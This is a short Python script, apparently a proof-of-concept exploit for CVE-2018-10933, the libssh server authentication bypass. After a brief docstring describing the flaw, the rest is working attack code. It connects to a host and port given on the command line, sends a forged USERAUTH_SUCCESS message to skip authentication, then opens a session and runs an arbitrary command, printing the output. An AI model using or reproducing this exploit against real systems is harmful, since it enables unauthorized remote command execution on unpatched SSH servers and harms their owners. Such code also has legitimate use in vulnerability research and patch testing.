#!/usr/bin/python3

"""
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10933
A vulnerability was found in libssh's server-side state machine before versions 0.7.6 and 0.8.4. 
A malicious client could create channels without first performing authentication, resulting in unauthorized access.
"""

import sys
import paramiko
import socket

HOST = str(sys.argv[1])
PORT = int(sys.argv[2])
COMMAND = sys.argv[3]

sock = socket.socket()

try:
    sock.connect((HOST, PORT))

    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()

    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)

    cmd = transport.open_session(timeout=5)
    cmd.exec_command(COMMAND)

    stdout = cmd.makefile("rb", 2048)
    output = stdout.read()
    stdout.close()

    for line in output.decode('utf-8').split('\n'):
        print(line)

except paramiko.SSHException as e:
    print(e)
except socket.error:
    print("Unable to connect.")
